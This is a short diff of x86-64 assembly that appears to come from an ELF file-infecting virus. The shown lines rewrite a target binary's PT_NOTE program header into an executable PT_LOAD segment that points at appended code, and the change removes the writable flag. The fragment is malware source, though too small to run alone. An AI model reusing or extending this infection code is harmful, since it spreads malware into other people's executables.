@@ -210,7 +210,7 @@ _start:
 
 			.patch_phdr:
 				mov dword [r15 + 208], PT_LOAD				; change phdr type in [r15 + 208] from PT_NOTE to PT_LOAD (1)
-				mov dword [r15 + 212], PF_R | PF_X | PF_W	; change phdr.flags in [r15 + 212] to PF_X (1) | PF_R (4) | PF_W (2)
+				mov dword [r15 + 212], PF_R | PF_X ;| PF_W	; change phdr.flags in [r15 + 212] to PF_X (1) | PF_R (4) | PF_W (2)
 				pop rax										; restoring target EOF offeset into rax
 				mov [r15 + 216], rax						; phdr.offset [r15 + 216] = target EOF offset
 				mov r13, [r15 + 48]							; storing target stat.st_size from [r15 + 48] in r13
